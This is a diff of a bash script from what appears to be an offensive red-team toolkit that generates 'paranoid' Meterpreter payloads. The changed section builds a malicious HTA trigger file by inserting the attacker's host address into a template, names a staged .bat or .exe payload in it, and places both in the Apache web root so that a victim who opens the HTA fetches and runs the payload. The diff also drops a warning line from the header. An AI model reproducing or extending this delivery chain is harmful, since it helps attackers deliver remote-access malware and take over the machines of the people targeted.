@@ -5,8 +5,7 @@
 # Distros Supported : Linux Kali, Mint, Ubuntu
 # Suspicious-Shell-Activity (SSA) RedTeam dev @2017
 # ---
-# WARNING THIS IS THE CORRECTION-FIX TO SHANTY PARROT OS
-# ---
+#
 # DESCRIPTION:
 # In some scenarios, it pays to be paranoid. This also applies to generating
 # and handling Meterpreter sessions. This script implements the Meterpreter
@@ -369,12 +368,22 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
         #
         # Building HTA trigger file ..
         #
-        echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
-        sleep 2
-        sed "s|LhOsT|$LhOsT|" EasyFileSharing.hta > trigger.hta
-        sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|" trigger.hta
-        mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
-        cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+        if [ "$DEFAULT_EXT" = "bat" ]; then
+          # barra bug-fix bat execution using hta ..
+          echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
+          sleep 2
+          sed "s|LhOsT|$LhOsT|" EasyFileSharing2.hta > trigger.hta
+          sed -i "s|NaMe|paranoid-staged.bat|g" trigger.hta
+          mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
+          cp $IPATH/output/paranoid-staged.exe $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
+        else
+          echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
+          sleep 2
+          sed "s|LhOsT|$LhOsT|" EasyFileSharing.hta > trigger.hta
+          sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|" trigger.hta
+          mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
+          cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+        fi
       #
       # Start apache2 service ..
       #
